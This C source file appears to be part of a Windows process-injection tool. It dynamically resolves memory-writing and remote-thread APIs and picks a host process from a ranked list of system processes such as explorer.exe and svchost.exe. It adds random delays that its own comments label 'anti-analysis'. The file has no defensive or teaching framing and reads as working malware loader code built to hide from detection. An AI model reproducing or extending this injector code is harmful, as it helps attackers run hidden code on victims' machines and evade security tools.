#include <windows.h>
#include <tlhelp32.h>
#include "../include/dynamic_api.h"

// Dynamically load API functions
BOOL load_dynamic_apis(API_POINTERS* apis) {
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32 == NULL) {
        return FALSE;
    }
    
    // Add some randomization in timing
    Sleep((rand() % 500) + 200);
    
    // Load base functions that we need regardless of configuration
    apis->pGetProcAddress = (FARPROC (WINAPI *)(HMODULE, LPCSTR))
                           GetProcAddress(hKernel32, "GetProcAddress");
    apis->pLoadLibraryA = (HMODULE (WINAPI *)(LPCSTR))
                         GetProcAddress(hKernel32, "LoadLibraryA");
    apis->pGetModuleHandleA = (HMODULE (WINAPI *)(LPCSTR))
                             GetProcAddress(hKernel32, "GetModuleHandleA");
    
    if (!apis->pGetProcAddress || !apis->pLoadLibraryA || !apis->pGetModuleHandleA) {
        return FALSE;
    }
    
    // Load core functions
    apis->pVirtualAllocEx = (LPVOID (WINAPI *)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))
                          apis->pGetProcAddress(hKernel32, "VirtualAllocEx");
    apis->pVirtualProtectEx = (BOOL (WINAPI *)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD))
                            apis->pGetProcAddress(hKernel32, "VirtualProtectEx");
    apis->pVirtualFreeEx = (BOOL (WINAPI *)(HANDLE, LPVOID, SIZE_T, DWORD))
                         apis->pGetProcAddress(hKernel32, "VirtualFreeEx");
    apis->pWriteProcessMemory = (BOOL (WINAPI *)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*))
                              apis->pGetProcAddress(hKernel32, "WriteProcessMemory");
    apis->pCreateRemoteThread = (HANDLE (WINAPI *)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, 
                                                 LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))
                               apis->pGetProcAddress(hKernel32, "CreateRemoteThread");
    apis->pWaitForSingleObject = (DWORD (WINAPI *)(HANDLE, DWORD))
                               apis->pGetProcAddress(hKernel32, "WaitForSingleObject");
    apis->pOpenProcess = (HANDLE (WINAPI *)(DWORD, BOOL, DWORD))
                        apis->pGetProcAddress(hKernel32, "OpenProcess");
    apis->pCloseHandle = (BOOL (WINAPI *)(HANDLE))
                        apis->pGetProcAddress(hKernel32, "CloseHandle");
    
    // Load advanced functions if needed
    HMODULE hNtdll = apis->pLoadLibraryA("ntdll.dll");
    if (hNtdll) {
        apis->pNtCreateThreadEx = apis->pGetProcAddress(hNtdll, "NtCreateThreadEx");
        apis->pRtlCreateUserThread = apis->pGetProcAddress(hNtdll, "RtlCreateUserThread");
    }
    
    apis->pQueueUserAPC = apis->pGetProcAddress(hKernel32, "QueueUserAPC");
    
    return (apis->pVirtualAllocEx != NULL && 
            apis->pVirtualProtectEx != NULL && 
            apis->pWriteProcessMemory != NULL &&
            apis->pOpenProcess != NULL &&
            apis->pCloseHandle != NULL);
}

// Find target process to inject into
DWORD find_target_process(API_POINTERS* apis) {
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    DWORD targetPID = 0;
    
    // List of potential targets, ordered by preference
    const char* targetProcesses[] = {
        "explorer.exe",       // Common user process
        "svchost.exe",        // System service process
        "RuntimeBroker.exe",  // Windows component
        "sihost.exe",         // Shell Infrastructure Host
        "smartscreen.exe",    // Windows Security Component
        "taskhostw.exe"       // Task Host
    };
    int numProcesses = sizeof(targetProcesses) / sizeof(targetProcesses[0]);

    // Anti-analysis: Add random delay
    Sleep((rand() % 1000) + 500);

    // Create a system snapshot
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Get first process
    if (!Process32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);
        return 0;
    }

    // Search for target processes
    do {
        for (int i = 0; i < numProcesses; i++) {
            if (_stricmp(pe32.szExeFile, targetProcesses[i]) == 0) {
                targetPID = pe32.th32ProcessID;
                CloseHandle(hProcessSnap);
                return targetPID;
            }
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return 0;
} 